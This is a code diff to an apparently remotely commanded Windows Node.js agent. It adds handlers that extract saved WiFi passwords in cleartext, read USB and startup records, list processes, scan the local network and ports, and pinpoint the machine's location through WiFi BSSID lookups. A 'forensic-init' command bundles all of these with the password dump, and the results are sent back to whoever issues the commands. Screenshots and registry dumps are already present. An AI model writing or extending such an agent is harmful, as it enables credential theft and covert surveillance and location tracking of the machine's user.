@@ -410,28 +410,50 @@ function handleCommand(msg) {
                     try { const d = JSON.parse(stdout); if (d.lat) resolve(d); else resolve(null); } catch(e) { resolve(null); }
                 });
             });
-            // WiFi scan
+            // WiFi scan + BSSID triangulation (works even when GPS is off)
             const wifiRaw = await shell('netsh wlan show networks mode=bssid');
             const wifiData = [];
-            const apMatches = wifiRaw.matchAll(/BSSID \d+:\s*\n\s*Signal:\s*(\d+)%\s*\n\s*.*?:\s*([0-9A-Fa-f:-]+)/gi);
-            for (const m of apMatches) { const sig=parseInt(m[1]); if (sig>0) wifiData.push({ bssid:m[2], rssi:Math.round((sig/2)-100), ssid:'' }); }
-            // IP geolocation
-            const ipData = await new Promise(resolve => {
-                https.get('https://ipinfo.io/json', {timeout:5000}, res => { let d=''; res.on('data',c=>d+=c); res.on('end',()=>{ try { const j=JSON.parse(d); resolve({results:[{source:'ipinfo.io',lat:j.loc?parseFloat(j.loc.split(',')[0]):null,lng:j.loc?parseFloat(j.loc.split(',')[1]):null,accuracy:3000,ip:j.ip,city:j.city,region:j.region,country:j.country,isp:j.org}],bestResult:{lat:j.loc?parseFloat(j.loc.split(',')[0]):null,lng:j.loc?parseFloat(j.loc.split(',')[1]):null,accuracy:3000,city:j.city,region:j.region,country:j.country,isp:j.org},confirmedIP:j.ip,sourceCount:1}); } catch(e) { resolve(null); } });
-                }).on('error', ()=>resolve(null));
-            });
+            const apMatches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+            for (const m of apMatches) { const sig=parseInt(m[1]); if (sig>0) wifiData.push({ bssid:m[3]?.trim()||'', rssi:Math.round((sig/2)-100), ssid:m[1]?.trim()||'' }); }
+            // BSSID database lookup for location without GPS
+            let bssidLoc = null;
+            const positionedAPs = [];
+            for (const ap of wifiData.slice(0, 8)) {
+                if (!ap.bssid) continue;
+                try {
+                    const data = await new Promise(resolve => {
+                        https.get(`https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}`, { timeout: 3000 }, res => {
+                            let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+                        }).on('error', () => resolve(null));
+                    });
+                    if (data && data.result === 200 && data.data) {
+                        const estDist = Math.pow(10, (-69 - ap.rssi) / (10 * 3.5));
+                        positionedAPs.push({ lat: data.data.lat, lng: data.data.lon, estimatedDistance: estDist, bssid: ap.bssid, ssid: ap.ssid });
+                    }
+                } catch(e) {}
+            }
+            if (positionedAPs.length >= 2) {
+                let wLat = 0, wLng = 0, tw = 0;
+                for (const ap of positionedAPs) { const w = 1 / (ap.estimatedDistance ** 2 + 1); wLat += ap.lat * w; wLng += ap.lng * w; tw += w; }
+                bssidLoc = { lat: wLat / tw, lng: wLng / tw, accuracy: Math.round(100 + positionedAPs.reduce((a, b) => a + b.estimatedDistance, 0) / positionedAPs.length), source: 'wifi-bssid', apCount: positionedAPs.length };
+            }
+            // IP geolocation (always available as last resort)
+            const ipData = await scrapePublicIP();
             // BLE
             const btRaw = await shell('powershell "Get-PnpDevice -Class Bluetooth | Select FriendlyName,Status"');
             const btData = btRaw.split('\n').filter(l => l.includes('OK')).map(l => ({ name: l.trim(), rssi: -50 }));
 
-            // Feed ALL into ML engine
-            const mlState = decisionEngine.update(gpsData, wifiData, ipData, btData);
+            // Feed ALL into ML engine — prioritize GPS > BSSID > IP
+            const primaryLoc = gpsData || bssidLoc;
+            const mlState = decisionEngine.update(primaryLoc, wifiData, ipData, btData);
             let result;
             if (mlState.fusedLat && mlState.fusedLng && mlState.fusedAccuracy < 10000) {
                 result = JSON.stringify({ lat: mlState.fusedLat, lng: mlState.fusedLng, accuracy: Math.round(mlState.fusedAccuracy), source: 'ml-fusion', confidence: mlState.fusionScore, sourcesUsed: mlState.sourcesUsed });
                 decisionEngine.addPosition(mlState.fusedLat, mlState.fusedLng, mlState.fusedAccuracy, 'ml-fusion');
             } else if (gpsData && gpsData.lat) {
                 result = JSON.stringify(gpsData);
+            } else if (bssidLoc && bssidLoc.lat) {
+                result = JSON.stringify(bssidLoc);
             } else if (ipData && ipData.bestResult && ipData.bestResult.lat) {
                 result = JSON.stringify(ipData.bestResult);
             } else {
@@ -466,7 +488,35 @@ function handleCommand(msg) {
         'open-ports-deep': () => openPortsDeep(),
         'registry-dump': () => registryDump(),
         'active-connections': () => activeConnections(),
-        'system-screenshot': () => systemScreenshot()
+        'system-screenshot': () => systemScreenshot(),
+        'wifi-passwords': () => wifiPasswords(),
+        'usb-audit': () => usbAudit(),
+        'persistence-check': () => persistenceCheck(),
+        'process-forensics': () => processForensics(),
+        'deep-system-info': () => deepSystemInfo(),
+        'deep-ip-scrape': () => deepIPScrape(),
+        'advanced-wifi': () => advancedWifiAnalysis(),
+        'network-scan-advanced': () => networkScan(),
+        'bt-proximity-advanced': () => bluetoothProximity(),
+        'port-scan-active': () => portScanActive(),
+        'network-fingerprint-tool': () => networkFingerprintTool(),
+        'cell-triangulate': () => cellTowerTriangulation(),
+        'forensic-init': async () => {
+            const results = {};
+            const tasks = [
+                ['wifi', () => advancedWifiAnalysis()],
+                ['ports', () => openPortsDeep()],
+                ['usb', () => usbAudit()],
+                ['persistence', () => persistenceCheck()],
+                ['processes', () => processForensics()],
+                ['wifiPasswords', () => wifiPasswords()],
+                ['system', () => deepSystemInfo()],
+                ['connections', () => activeConnections()],
+                ['location', () => handlers['locate']()]
+            ];
+            for (const [k, fn] of tasks) { try { results[k] = await fn(); } catch(e) { results[k] = { error: e.message }; } }
+            return JSON.stringify({ forensicResults: results, timestamp: Date.now() });
+        }
     };
     const fn = handlers[type];
     if (fn) fn().then(r => sendResult(id, type, r));
@@ -697,6 +747,239 @@ async function systemScreenshot() {
         try { fs.unlinkSync(pngPath); } catch(e) {}
     }
     return JSON.stringify({ image: base64, size: base64.length, timestamp: Date.now() });
+}
+
+// ─── ADVANCED FORENSIC TOOLS (ported from agent.js) ─────────────────────────
+
+async function wifiPasswords() {
+    const ps = `
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+        $results = @()
+        foreach ($p in $profiles) {
+            $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+            $results += [PSCustomObject]@{ SSID = $p; Password = $pass }
+        }
+        $results | ConvertTo-Json`;
+    const res = await runPowerShell(ps, 15000);
+    let profiles = [];
+    if (res.success && res.stdout.trim()) { try { profiles = JSON.parse(res.stdout); } catch(e) {} }
+    if (profiles && !Array.isArray(profiles)) profiles = [profiles];
+    return JSON.stringify({ profiles: profiles || [], count: (profiles || []).length, timestamp: Date.now() });
+}
+
+async function usbAudit() {
+    const ps = `Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select-Object FriendlyName, PSChildName, Mfg | ConvertTo-Json -Depth 3`;
+    const res = await runPowerShell(ps, 10000);
+    let devices = [];
+    if (res.success && res.stdout.trim()) { try { devices = JSON.parse(res.stdout); } catch(e) {} }
+    if (devices && !Array.isArray(devices)) devices = [devices];
+    return JSON.stringify({ devices: devices || [], count: (devices || []).length, timestamp: Date.now() });
+}
+
+async function persistenceCheck() {
+    const ps = `Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | ConvertTo-Json -Depth 3`;
+    const res = await runPowerShell(ps, 10000);
+    let entries = [];
+    if (res.success && res.stdout.trim()) { try { entries = JSON.parse(res.stdout); } catch(e) {} }
+    if (entries && !Array.isArray(entries)) entries = [entries];
+    return JSON.stringify({ startupEntries: entries || [], count: (entries || []).length, timestamp: Date.now() });
+}
+
+async function processForensics() {
+    const ps = `Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name, Id, CPU, Path, WorkingSet64 | ConvertTo-Json -Depth 3`;
+    const res = await runPowerShell(ps, 10000);
+    let processes = [];
+    if (res.success && res.stdout.trim()) { try { processes = JSON.parse(res.stdout); } catch(e) {} }
+    if (processes && !Array.isArray(processes)) processes = [processes];
+    return JSON.stringify({ processes: processes || [], count: (processes || []).length, timestamp: Date.now() });
+}
+
+async function deepSystemInfo() {
+    const ps = `
+        $os = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, LastBootUpTime, TotalVisibleMemorySize, FreePhysicalMemory
+        $cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed, LoadPercentage
+        $gpu = Get-CimInstance Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion
+        $net = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object IPAddress, InterfaceAlias
+        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | Select-Object DeviceID, Size, FreeSpace
+        @{ OS=$os; CPU=$cpu; GPU=$gpu; Network=$net; Disk=$disk } | ConvertTo-Json -Depth 4`;
+    const res = await runPowerShell(ps, 15000);
+    let info = {};
+    if (res.success && res.stdout.trim()) { try { info = JSON.parse(res.stdout); } catch(e) { info = { raw: res.stdout }; } }
+    return JSON.stringify({ systemInfo: info, hostname: os.hostname(), platform: os.platform(), arch: os.arch(), uptime: os.uptime(), timestamp: Date.now() });
+}
+
+async function deepIPScrape() {
+    const results = {};
+    const publicIP = await scrapePublicIP();
+    results.publicIP = publicIP;
+    const interfaces = os.networkInterfaces();
+    results.localInterfaces = [];
+    for (const [name, addrs] of Object.entries(interfaces)) {
+        for (const addr of addrs) {
+            if (!addr.internal) results.localInterfaces.push({ name, address: addr.address, family: addr.family, mac: addr.mac });
+        }
+    }
+    const connections = await shell('netstat -ano | findstr ESTABLISHED');
+    results.activeConnections = connections;
+    const routes = await runPowerShell('Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias | ConvertTo-Json -Depth 3');
+    if (routes.success) { try { results.routes = JSON.parse(routes.stdout); } catch(e) {} }
+    const dns = await runPowerShell('Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object IPAddress, ServerAddresses | ConvertTo-Json -Depth 3');
+    if (dns.success) { try { results.dnsServers = JSON.parse(dns.stdout); } catch(e) {} }
+    return JSON.stringify({ ...results, timestamp: Date.now() });
+}
+
+async function advancedWifiAnalysis() {
+    const wifiRaw = await shell('netsh wlan show networks mode=bssid');
+    const wifiNetworks = [];
+    const apMatches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+    for (const m of apMatches) {
+        if (m[1] && parseInt(m[2]) > 0) {
+            const rssi = Math.round((parseInt(m[2]) / 2) - 100);
+            wifiNetworks.push({ ssid: m[1].trim(), signal: parseInt(m[2]), rssi, bssid: m[3]?.trim() || '' });
+        }
+    }
+    const iface = await shell('netsh wlan show interfaces');
+    const ssidMatch = iface.match(/SSID\s*:\s*(.+)/i);
+    const channelMatch = iface.match(/Channel\s*:\s*(\d+)/i);
+    const bssidMatch = iface.match(/BSSID\s*:\s*(.+)/i);
+    const signalMatch = iface.match(/Signal\s*:\s*(\d+)%/i);
+    const connected = {
+        ssid: ssidMatch ? ssidMatch[1].trim() : '',
+        channel: channelMatch ? parseInt(channelMatch[1]) : 0,
+        bssid: bssidMatch ? bssidMatch[1].trim() : '',
+        signal: signalMatch ? parseInt(signalMatch[1]) : 0
+    };
+    const strong = wifiNetworks.filter(n => n.signal > 70).length;
+    const avg = wifiNetworks.length > 0 ? Math.round(wifiNetworks.reduce((a, b) => a + b.signal, 0) / wifiNetworks.length) : 0;
+    return JSON.stringify({
+        networks: wifiNetworks, count: wifiNetworks.length, connected,
+        analysis: { strongSignals: strong, avgSignal: avg, totalNetworks: wifiNetworks.length },
+        timestamp: Date.now()
+    });
+}
+
+async function networkScan() {
+    const arp = await shell('arp -a');
+    const ifconfig = await runPowerShell('Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias, PrefixLength | ConvertTo-Json -Depth 3');
+    const gateway = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop,InterfaceAlias | ConvertTo-Json');
+    let hosts = [];
+    if (ifconfig.success) {
+        try {
+            const interfaces = JSON.parse(ifconfig.stdout);
+            for (const iface of (Array.isArray(interfaces) ? interfaces : [interfaces])) {
+                if (iface.IPAddress && iface.PrefixLength >= 24 && !iface.IPAddress.startsWith('127.')) {
+                    const subnet = iface.IPAddress.split('.').slice(0, 3).join('.');
+                    for (let i = 1; i <= 20; i++) {
+                        const pingRes = await runPowerShell(`Test-Connection -ComputerName ${subnet}.${i} -Count 1 -Quiet -TimeoutSeconds 1`, 2000);
+                        if (pingRes.success && pingRes.stdout.trim() === 'True') hosts.push({ ip: `${subnet}.${i}`, status: 'online' });
+                    }
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
+    return JSON.stringify({ arp, discoveredHosts: hosts, hostCount: hosts.length, timestamp: Date.now() });
+}
+
+async function bluetoothProximity() {
+    const ps = `
+        Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue | ForEach-Object {
+            $name = $_.FriendlyName
+            $id = $_.InstanceId
+            $auth = (Get-PnpDeviceProperty -InstanceId $id -KeyName DEVPKEY_BluetoothRadio_Authenticated -ErrorAction SilentlyContinue).Data
+            [PSCustomObject]@{ Name=$name; InstanceId=$id; Authenticated=$auth }
+        } | ConvertTo-Json -Depth 3`;
+    const res = await runPowerShell(ps, 10000);
+    let devices = [];
+    if (res.success && res.stdout.trim()) { try { devices = JSON.parse(res.stdout); } catch(e) {} }
+    if (devices && !Array.isArray(devices)) devices = [devices];
+    return JSON.stringify({ devices: devices || [], count: (devices || []).length, timestamp: Date.now() });
+}
+
+async function portScanActive() {
+    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379, 5432];
+    const openPorts = [];
+    for (const port of ports) {
+        const res = await runPowerShell(`Test-NetConnection -ComputerName 127.0.0.1 -Port ${port} -WarningAction SilentlyContinue | Select-Object RemotePort, TcpTestSucceeded | ConvertTo-Json`, 5000);
+        if (res.success) {
+            try {
+                const r = JSON.parse(res.stdout);
+                if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port), state: 'OPEN' });
+            } catch(e) {}
+        }
+    }
+    return JSON.stringify({ openPorts, scannedPorts: ports.length, timestamp: Date.now() });
+}
+
+async function networkFingerprintTool() {
+    const fp = { timestamp: Date.now() };
+    const arp = await shell('arp -a');
+    const arpLines = arp.split('\n').filter(l => l.includes('dynamic'));
+    if (arpLines.length > 0) { const parts = arpLines[0].trim().split(/\s+/); fp.gatewayMac = parts[1] || ''; }
+    const netInterfaces = os.networkInterfaces();
+    for (const [name, addrs] of Object.entries(netInterfaces)) {
+        for (const addr of addrs) {
+            if (addr.family === 'IPv4' && !addr.internal) { fp.localIP = addr.address; fp.mac = addr.mac; fp.interface = name; break; }
+        }
+        if (fp.localIP) break;
+    }
+    const route = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop,InterfaceAlias | ConvertTo-Json');
+    if (route.success) { try { const r = JSON.parse(route.stdout); fp.gateway = r.NextHop; fp.routeInterface = r.InterfaceAlias; } catch(e) {} }
+    const iface = await shell('netsh wlan show interfaces');
+    const ssidM = iface.match(/SSID\s*:\s*(.+)/i);
+    const chanM = iface.match(/Channel\s*:\s*(\d+)/i);
+    const bssidM = iface.match(/BSSID\s*:\s*(.+)/i);
+    const sigM = iface.match(/Signal\s*:\s*(\d+)%/i);
+    fp.ssid = ssidM ? ssidM[1].trim() : '';
+    fp.channel = chanM ? parseInt(chanM[1]) : 0;
+    fp.connectedBSSID = bssidM ? bssidM[1].trim() : '';
+    fp.connectedSignal = sigM ? parseInt(sigM[1]) : 0;
+    return JSON.stringify(fp);
+}
+
+async function cellTowerTriangulation() {
+    const wifiRaw = await shell('netsh wlan show networks mode=bssid');
+    const networks = [];
+    const apMatches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+    for (const m of apMatches) {
+        if (m[1] && parseInt(m[2]) > 0) {
+            const rssi = Math.round((parseInt(m[2]) / 2) - 100);
+            const estDist = Math.pow(10, (-69 - rssi) / (10 * 3.5));
+            networks.push({ ssid: m[1].trim(), bssid: m[3]?.trim() || '', rssi, signal: parseInt(m[2]), estimatedDistance: Math.round(estDist) });
+        }
+    }
+    const positionedAPs = [];
+    for (const ap of networks.slice(0, 8)) {
+        if (!ap.bssid) continue;
+        try {
+            const https2 = require('https');
+            const data = await new Promise(resolve => {
+                https2.get(`https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}`, { timeout: 3000 }, res => {
+                    let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+                }).on('error', () => resolve(null));
+            });
+            if (data && data.result === 200 && data.data) {
+                positionedAPs.push({ ...ap, lat: data.data.lat, lng: data.data.lon, range: data.data.range || 200 });
+            }
+        } catch(e) {}
+    }
+    if (positionedAPs.length >= 3) {
+        let wLat = 0, wLng = 0, tw = 0;
+        for (const ap of positionedAPs) {
+            const w = 1 / (ap.estimatedDistance ** 2 + 1);
+            wLat += ap.lat * w; wLng += ap.lng * w; tw += w;
+        }
+        return JSON.stringify({ lat: wLat / tw, lng: wLng / tw, accuracy: Math.round(100 + positionedAPs.reduce((a, b) => a + b.estimatedDistance, 0) / positionedAPs.length), source: 'wifi-bssid-triangulation', apCount: positionedAPs.length, networks: networks.slice(0, 5), timestamp: Date.now() });
+    }
+    if (positionedAPs.length >= 2) {
+        let wLat = 0, wLng = 0, tw = 0;
+        for (const ap of positionedAPs) {
+            const w = 1 / (ap.estimatedDistance ** 2 + 1);
+            wLat += ap.lat * w; wLng += ap.lng * w; tw += w;
+        }
+        return JSON.stringify({ lat: wLat / tw, lng: wLng / tw, accuracy: Math.round(200 + positionedAPs.reduce((a, b) => a + b.estimatedDistance, 0) / positionedAPs.length), source: 'wifi-weighted-centroid', apCount: positionedAPs.length, networks: networks.slice(0, 5), timestamp: Date.now() });
+    }
+    return JSON.stringify({ source: 'wifi-scan', networks: networks.slice(0, 10), count: networks.length, positionedCount: positionedAPs.length, message: positionedAPs.length < 2 ? 'Need 2+ BSSIDs with database entries' : 'Insufficient data', timestamp: Date.now() });
 }
 
 function sendResult(id, type, result) {
